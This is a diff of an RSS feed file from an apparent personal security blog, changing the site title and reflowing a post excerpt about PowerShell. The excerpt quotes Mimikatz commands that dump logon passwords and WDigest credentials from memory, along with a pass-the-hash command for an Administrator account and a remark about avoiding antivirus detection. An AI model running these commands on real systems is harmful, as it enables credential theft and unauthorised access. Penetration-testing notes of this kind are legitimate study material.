@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Powershell on BLACKVOLGA</title>
+    <title>Powershell on BLVCKƔXLGV</title>
     <link>https://blackvolga.github.io/tags/powershell/</link>
-    <description>Recent content in Powershell on BLACKVOLGA</description>
+    <description>Recent content in Powershell on BLVCKƔXLGV</description>
     <generator>Hugo -- gohugo.io</generator>
     <managingEditor>blackvolga@pm.me (GAZ23)</managingEditor>
     <webMaster>blackvolga@pm.me (GAZ23)</webMaster>
@@ -20,7 +20,8 @@
       <guid>https://blackvolga.github.io/intel/powershell/</guid>
       <description>https://github.com/gentilkiwi/mimikatz
 https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
-TLDR: 1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
+TLDR:
+1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
 extract passwds
 1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
 1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
